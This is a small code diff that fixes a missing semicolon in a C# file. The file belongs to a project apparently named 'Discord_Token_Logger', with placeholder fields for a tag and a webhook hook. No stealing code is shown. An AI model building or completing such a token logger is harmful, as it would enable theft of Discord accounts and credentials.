@@ -14,7 +14,7 @@ namespace Discord_Token_Logger
         static string Tag = "TagReplace";
         static string dfas = "HookReplace";
         static string Content = "";
-        static string Version = "0.9"
+        static string Version = "0.9";
 
         static void Main()
         {
